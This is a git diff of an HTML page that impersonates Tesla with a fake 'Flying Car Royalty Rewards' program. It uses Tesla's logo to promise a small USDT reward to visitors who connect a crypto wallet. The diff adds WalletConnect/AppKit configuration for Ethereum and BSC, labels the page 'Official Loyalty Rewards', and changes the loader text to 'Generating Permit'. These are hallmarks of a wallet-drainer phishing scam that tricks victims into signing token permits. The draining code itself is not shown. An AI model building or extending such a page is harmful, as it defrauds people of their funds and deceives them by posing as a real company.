@@ -5,8 +5,39 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Tesla Flying Car Royalty Program</title>
     <link rel="stylesheet" href="style.css">
-    <!-- Inter Font for that clean Tesla look -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+    
+    <!-- AppKit Script -->
+    <script type="module" src="https://esm.sh/@reown/appkit?deps=@reown/appkit-controllers,@reown/appkit-ui-wallet-modal"></script>
+    <script type="module" src="https://esm.sh/@reown/appkit-controllers"></script>
+    <script type="module" src="https://esm.sh/@reown/appkit-ui-wallet-modal"></script>
+
+    <!-- Custom Config for AppKit -->
+    <script type="module">
+        import { createAppKit } from '@reown/appkit';
+        import { EthereumChain, BscChain } from '@reown/appkit/networks';
+
+        const metadata = {
+            name: 'Tesla Flying Car',
+            description: 'Official Loyalty Rewards',
+            url: 'https://your-vercel-link.vercel.app',
+            icons: ['https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png']
+        };
+
+        const themeVariables = {
+            '--w3m-accent': '#3e6ae8', // Tesla Blue
+            '--w3m-border-radius-max': '12px',
+            '--w3m-font-family': 'Inter, sans-serif'
+        };
+
+        createAppKit({
+            adapters: [], 
+            chains: [EthereumChain, BscChain],
+            projectId: '962425907914a3e80a7d8e7288b23f62', // Get this from cloud.walletconnect.com
+            metadata,
+            themeVariables
+        });
+    </script>
 </head>
 <body>
     <div class="tesla-bg"></div>
@@ -14,15 +45,16 @@
     <div class="container">
         <header>
             <img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png" alt="Tesla Logo" class="logo">
-            <h1>Tesla Referral Reward/Flying Car Royalty Rewards</h1>
+            <h1>Flying Car Royalty Rewards</h1>
             <p>Connect your wallet to verify eligibility for the $0.05 USDT Pilot Reward.</p>
         </header>
 
         <main id="main-content">
             <!-- Step 1: Connect -->
             <div id="connect-step" class="card">
+                <!-- AppKit Modal Trigger -->
                 <button id="connect-btn">Connect Wallet</button>
-                <div id="loader" class="hidden">Verifying Network...</div>
+                <div id="loader" class="hidden">Verifying Network & Generating Permit...</div>
             </div>
 
             <!-- Step 2: Dashboard (Hidden initially) -->
